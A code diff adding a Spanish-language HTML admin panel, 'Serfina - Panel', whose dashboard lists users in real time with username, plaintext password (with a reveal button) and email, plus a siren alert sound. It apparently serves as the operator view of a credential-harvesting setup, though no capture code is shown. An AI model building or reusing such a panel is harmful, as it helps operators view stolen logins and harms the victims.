@@ -1,0 +1,48 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Serfina Admin</title>
+  <link rel="stylesheet" href="/admin/static/admin.css">
+</head>
+<body>
+  <div id="app">
+    <header class="topbar">
+      <h1>Serfina - Panel</h1>
+      <div id="admin-controls">
+        <button id="logoutBtn">Salir</button>
+      </div>
+    </header>
+
+    <main>
+      <section id="loginSection" class="card">
+        <h2>Login administrador</h2>
+        <form id="loginForm">
+          <input name="user" placeholder="Usuario admin" required>
+          <input name="pass" type="password" placeholder="Contraseña" required>
+          <button>Entrar</button>
+        </form>
+      </section>
+
+      <section id="dashboard" class="hidden">
+        <h2>Usuarios en tiempo real</h2>
+        <div id="alerts"></div>
+        <div id="tablewrap"></div>
+      </section>
+    </main>
+
+    <template id="row-template">
+      <div class="row card">
+        <div class="col user">__USUARIO__</div>
+        <div class="col pass">__PASS__ <button class="eye">👁</button></div>
+        <div class="col email">__EMAIL__</div>
+        <div class="col actions">__ACTIONS__</div>
+      </div>
+    </template>
+  </div>
+  <audio id="alert-sound" src="/sounds/sirena.wav" preload="auto"></audio>
+  <script src="https://cdn.socket.io/4.7.1/socket.io.min.js"></script>
+  <script src="/admin/static/admin.js"></script>
+</body>
+</html>
